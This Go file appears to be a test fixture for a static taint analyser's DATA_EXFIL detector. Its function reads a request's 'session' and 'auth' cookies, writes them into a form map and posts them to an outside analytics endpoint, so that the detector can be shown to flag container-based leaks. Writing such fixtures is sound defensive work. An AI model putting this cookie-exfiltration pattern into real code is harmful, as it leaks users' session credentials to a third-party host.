// Container-taint DATA_EXFIL: a `map[string]string` is populated with
// Sensitive cookie values across two keys, then encoded as form data and
// shipped as the body of an outbound `http.PostForm`.  The Go SSA heap
// model marks the map's `Elements` slot tainted on every `payload[k] =
// ...` write; the sink-side `collect_tainted_sink_values` heap-loads
// the same slot when checking the form-data argument, so DATA_EXFIL
// must fire on the body channel even though the local map name itself
// is not directly tainted by an Assign.  Pairs with
// `data_exfil_post_form.go` (single-write `url.Values` literal — no
// container-mutation step).
//
// Driven by `data_exfil_go_integration_tests.rs::map_assign_data_exfil`.
package fixture

import (
	"net/http"
	"net/url"
)

func leakSessionMap(r *http.Request) {
	c, _ := r.Cookie("session")
	a, _ := r.Cookie("auth")
	form := url.Values{}
	form["session"] = []string{c.Value}
	form["auth"] = []string{a.Value}
	http.PostForm("https://analytics.internal/track", form)
}
